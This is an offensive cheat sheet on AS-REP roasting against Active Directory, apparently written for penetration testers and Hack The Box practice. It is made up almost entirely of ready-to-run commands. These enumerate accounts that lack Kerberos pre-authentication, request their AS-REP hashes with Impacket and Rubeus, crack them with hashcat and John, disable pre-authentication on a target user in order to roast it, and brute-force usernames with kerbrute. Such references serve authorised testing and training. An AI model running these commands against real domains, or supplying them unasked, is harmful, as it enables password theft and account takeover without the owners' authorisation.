title: asrep-roasting
html:
asrep-roasting

Request AS-REP for accounts with "Do not require Kerberos pre-authentication" enabled. No domain credentials needed if you have a username list. The encrypted part of the AS-REP can be cracked offline.

When to Use

- Accounts with DONT_REQUIRE_PREAUTH UAC flag set - No valid domain creds yet (just need usernames) - Or have creds and want to find vulnerable accounts

Enumeration

Find DONT_REQUIRE_PREAUTH accounts (with creds)

ldapsearch -H ldap://DC -D 'user@domain.local' -w 'pass' \
  -b 'DC=domain,DC=local' \
  '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' \
  sAMAccountName

PowerView

Get-DomainUser -PreauthNotRequired | Select-Object samaccountname

Attack - Impacket (GetNPUsers.py)

With known vulnerable user (no creds needed)

GetNPUsers.py 'domain.local/targetuser' -dc-ip DC_IP -no-pass -format hashcat -outputfile asrep.txt

With user list (no creds needed)

GetNPUsers.py 'domain.local/' -dc-ip DC_IP -no-pass -usersfile users.txt -format hashcat -outputfile asrep.txt

With domain creds (auto-finds vulnerable accounts)

GetNPUsers.py 'domain.local/user:pass' -dc-ip DC_IP -request -format hashcat -outputfile asrep.txt

With Kerberos auth

export KRB5CCNAME=/path/to/ticket.ccache
GetNPUsers.py 'domain.local/user' -k -no-pass -dc-ip DC_IP -request -format hashcat -outputfile asrep.txt

Attack - Rubeus

All AS-REP roastable users

.\Rubeus.exe asreproast /outfile:asrep.txt /format:hashcat

Target specific user

.\Rubeus.exe asreproast /user:targetuser /outfile:asrep.txt /format:hashcat

Cracking

Hashcat mode 18200

hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

John

john asrep.txt --wordlist=/usr/share/wordlists/rockyou.txt

Targeted AS-REP Roasting

If you have GenericAll/GenericWrite over a user, disable preauth, roast, then re-enable.

Disable preauth with PowerView

Set-DomainObject -Identity targetuser -XOR @{useraccountcontrol=4194304}

Disable preauth with bloodyAD

bloodyAD -d domain.local -u user -p pass --host DC_IP add uac targetuser -f DONT_REQ_PREAUTH

Re-enable preauth after roasting (clean up)

Set-DomainObject -Identity targetuser -XOR @{useraccountcontrol=4194304}
bloodyAD -d domain.local -u user -p pass --host DC_IP remove uac targetuser -f DONT_REQ_PREAUTH

Username Enumeration (Pre-Attack)

If you have no usernames at all, enumerate first:

# Kerbrute username enum
kerbrute userenum -d domain.local --dc DC_IP /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# enum4linux-ng
enum4linux-ng -A DC_IP

Notes

- AS-REP roasting does NOT require valid credentials, only valid usernames - Hashcat mode 18200 is the standard mode for AS-REP hashes - These hashes crack faster than Kerberoast hashes (RC4 encrypted with user's password) - DONT_REQUIRE_PREAUTH is rare in real environments but common in HTB
